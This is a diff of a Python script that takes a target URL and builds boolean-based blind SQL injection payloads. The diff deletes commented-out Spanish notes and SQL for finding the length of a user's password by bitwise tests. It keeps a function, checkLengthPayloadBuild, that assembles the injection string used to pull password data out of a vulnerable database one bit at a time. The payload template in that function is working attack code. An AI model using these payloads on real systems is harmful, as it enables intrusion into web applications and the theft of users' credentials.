@@ -23,17 +23,6 @@ if (len(sys.argv) != 2):
 
 url = sys.argv[1]
 bits = [1,2,4,8,16,32,64,128]
-#payload = ""
-
-#characters = strings.2
-
-# bitwise para saber el len, se calcula por caracter
-# case when ord(substr(binary(select length(password) from users where username = 'pepe'),2,1))&1=1 then 1 else 0 end
-
-#select (length(password))&4 from users where username = 'pepe';
-
-# bitwise para saber el len, se calcula con el valor decimal del string resultante de len
-#select case when ord(binary(select length(password) from users where username = 'pepe'))&1=1 then 1 else 0 end;
 
 def checkLengthPayloadBuild(column_name, table_name, conditional_key, conditional_value):
     payload = "' and case when ord(binary(select length(%s) from %s where %s = \'%s\'))&%d=%d then 1 else 0 end -- -" %(column_name, table_name, conditional_key, conditional_value)  
